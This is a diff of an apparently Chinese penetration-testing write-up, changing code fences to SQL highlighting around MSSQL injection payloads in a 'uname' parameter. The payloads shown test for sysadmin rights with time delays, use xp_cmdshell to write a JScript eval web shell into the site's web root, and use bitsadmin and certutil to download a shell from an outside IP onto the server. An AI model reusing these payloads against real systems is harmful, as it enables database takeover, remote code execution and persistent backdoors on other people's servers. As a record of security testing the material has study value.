@@ -44,7 +44,7 @@ uname=test';if(1=(select is_srvrolemember('sysadmin'))) WAITFOR DELAY '0:0:2';--
 
 * 判断是否是站库分离(延时后返回正确页面，确定站库没有分离)
 
-```
+```sql
 uname=test';if(host_name()=@@servername) WAITFOR DELAY '0:0:5';--
 ```
 
@@ -127,7 +127,7 @@ uname=test';exec master..xp_cmdshell 'echo test >D:\bak\20170226\bak\20170403.2\
 依次写文件然后访问，在写入 ```D:\bak\20170226\webapp\Content\layer\123.txt```时，访问```http://111.*.*.59/Content/layer/123.txt```能正常访问到123.txt，返回内容为test，证明web路径就是D:\bak\20170226\webapp\
 <br>
 尝试写入一句话(< >的前面要加^)
-```
+```sql
 uname=test';exec master..xp_cmdshell 'echo ^<%@ Page Language="Jscript"%^>^<%eval(Request.item["Aa1234567"],"unsafe");%^> > D:\bak\20170226\webapp\Content\layer\cc.aspx';--
 ```
 
@@ -137,12 +137,12 @@ uname=test';exec master..xp_cmdshell 'echo ^<%@ Page Language="Jscript"%^>^<%eva
 * 尝试直接下载shell到服务器
 
 使用bitsadmin下载时并没有成功，访问```http://111.*.*.59/Content/layer/aaa.aspx```返回404
-```
+```sql
 uname=test';exec master..xp_cmdshell 'bitsadmin /rawreturn /transfer getfile http://59.108.123.123/aaa.aspx D:\bak\20170226\webapp\Content\layer\aaa.aspx';--
 ```
 
 使用certutil下载时才成功，得到shell地址```http://111.*.*.59/Content/layer/aaa.aspx```
-```
+```sql
 uname=test';exec master..xp_cmdshell 'certutil -urlcache -split -f http://59.108.123.123/aaa.aspx D:\bak\20170226\webapp\Content\layer\aaa.aspx';--
 ```
 ![70](/img/post/Xnip2019-03-03_20-42-24.png)
